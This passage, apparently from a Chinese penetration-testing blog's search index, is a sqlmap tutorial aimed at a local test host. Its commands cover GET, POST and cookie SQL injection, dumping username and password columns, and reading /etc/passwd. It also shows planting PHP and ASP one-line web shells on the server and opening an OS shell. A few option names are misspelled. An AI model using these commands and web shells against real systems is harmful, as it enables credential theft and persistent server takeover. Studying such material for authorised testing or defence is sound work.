class="string">&quot;http://127.0.0.1/index.jsp?id=1&quot;</span> --dbms orcale --columns -T <span class="string">&quot;mmanage&quot;</span> -D <span class="string">&quot;admin&quot;</span></span><br></pre></td></tr></table></figure><h2 id="获取数据-3"><a href="#获取数据-3" class="headerlink" title="获取数据"></a>获取数据</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/index.jsp?id=1&quot;</span> --dbms orcale --dump -C <span class="string">&quot;username,password&quot;</span> -T <span class="string">&quot;mmanage&quot;</span> -D <span class="string">&quot;admin&quot;</span></span><br></pre></td></tr></table></figure><h1 id="Post注入网站"><a href="#Post注入网站" class="headerlink" title="Post注入网站"></a>Post注入网站</h1><h2 id="检测是否存在注入-4"><a href="#检测是否存在注入-4" class="headerlink" title="检测是否存在注入"></a>检测是否存在注入</h2><p>post信息</p><p>name&#x3D;admin&amp;sub&#x3D;%E6%90%9C</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/index.php&quot;</span> --data <span class="string">&quot;name=admin&amp;sub=%E6%90%9C&quot;</span> -p name -v 3</span><br></pre></td></tr></table></figure><h2 id="获取当前用户和数据库名-3"><a href="#获取当前用户和数据库名-3" class="headerlink" title="获取当前用户和数据库名"></a>获取当前用户和数据库名</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/index.php&quot;</span> --data <span class="string">&quot;name=admin&amp;sub=%E6%90%9C&quot;</span> --current-user --current-db -p name -v 3</span><br></pre></td></tr></table></figure><p>如果是root用户，可以直接列出所有的数据库</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/index.php&quot;</span> --data <span class="string">&quot;name=admin&amp;sub=%E6%90%9C&quot;</span> --dbs -v 3</span><br></pre></td></tr></table></figure><h2 id="获取表名-4"><a href="#获取表名-4" class="headerlink" title="获取表名"></a>获取表名</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/index.php&quot;</span> --data <span class="string">&quot;name=admin&amp;sub=%E6%90%9C&quot;</span> --tables -D <span class="string">&quot;admin&quot;</span> -p name -v 3</span><br></pre></td></tr></table></figure><h1 id="Cookie注入网站"><a href="#Cookie注入网站" class="headerlink" title="Cookie注入网站"></a>Cookie注入网站</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/index.jsp&quot;</span> --cookie <span class="string">&quot;id=1&quot;</span> --level 2</span><br><span class="line"><span class="comment"># 指定测试等级，level&gt;=2时才会检测cookie</span></span><br></pre></td></tr></table></figure><h2 id="获取数据-4"><a href="#获取数据-4" class="headerlink" title="获取数据"></a>获取数据</h2><p>其他步骤和上面的一样</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/index.jsp&quot;</span> --cookie <span class="string">&quot;id=1&quot;</span> --dump -C <span class="string">&quot;username,password&quot;</span> -T <span class="string">&quot;mmanage&quot;</span> -D <span class="string">&quot;admin&quot;</span> --level 2</span><br></pre></td></tr></table></figure><h1 id="Mysql注入对网站读写操作"><a href="#Mysql注入对网站读写操作" class="headerlink" title="Mysql注入对网站读写操作"></a>Mysql注入对网站读写操作</h1><h2 id="读"><a href="#读" class="headerlink" title="读"></a>读</h2><p>只有root用户才有权限</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/index.php?id=1&quot;</span> --file-read <span class="string">&quot;/etc/passwd&quot;</span> -v 1</span><br><span class="line"><span class="comment"># 读取/etc/passwd文件内容</span></span><br></pre></td></tr></table></figure><p>读取到的文件内容会保存在output文件夹里面</p><h2 id="写"><a href="#写" class="headerlink" title="写"></a>写</h2><p>前提：要知道写入文件的路径，可以通过phpinfo，找到DOCUMENT_ROOT</p><p>先创建一个一句话木马的文件muma.php</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    system(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/index.php?id=1&quot;</span> --file-write c:/muma.php --file-dest /www/web/default/simple/muma.php -v 1</span><br></pre></td></tr></table></figure><h1 id="Mysql交互式写shell和执行命令"><a href="#Mysql交互式写shell和执行命令" class="headerlink" title="Mysql交互式写shell和执行命令"></a>Mysql交互式写shell和执行命令</h1><p>前提：magic_autoes_gpc必须是关闭的才可以，phpinfo可以查看</p><p>需要root权限</p><p>有写的权限</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/index.php?id=1&quot;</span> --os-cmd=<span class="built_in">whoami</span></span><br></pre></td></tr></table></figure><p>上面的这条命令效果不是很好，建议使用下面这条，但是会产生两个文件</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/index.php?id=1&quot;</span> --os-shell</span><br></pre></td></tr></table></figure><p>在 <code>os-shell</code>中将一句话木马写入</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> ^&lt;%<span class="built_in">eval</span> request(<span class="string">&quot;#&quot;</span>)%^&gt;&gt;d:\wwwroot\muma.asp</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
